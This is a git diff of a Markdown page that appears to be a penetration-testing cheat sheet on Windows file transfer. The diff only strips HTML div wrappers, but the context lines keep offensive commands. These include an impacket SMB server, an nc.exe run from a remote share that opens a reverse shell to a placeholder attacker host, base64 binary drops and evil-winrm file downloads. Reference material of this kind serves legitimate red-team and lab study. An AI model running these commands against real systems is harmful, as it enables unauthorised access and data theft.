@@ -11,17 +11,11 @@ tags: ["file transfer", "Windows", "smb", "evil-winrm"]
 
 #### Start a Local SMB Server
 
-<div>
-
 ```console
 impacket-smbserver share . -smb2support
 ```
 
-</div>
-
 #### cmd
-
-<div>
 
 ```console
 # Connect to SMB server without creds
@@ -58,14 +52,10 @@ net use /d \\<LOCAL_IP>\share
 \\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
 #### Small binary
-
-<div>
 
 ```console
 # In target Windows
@@ -79,20 +69,12 @@ echo -n '<BASE64_BINARY>' | base64 -d > <FILE>
 
 <small>*Note: For restricted environment*</small>
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab3 >}}
-
-<div>
 
 ```console
 # Evil-winrm built-in function
 download 'C:\ProgramData\<FILE>' '<LOCAL_DEST_PATH>'
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
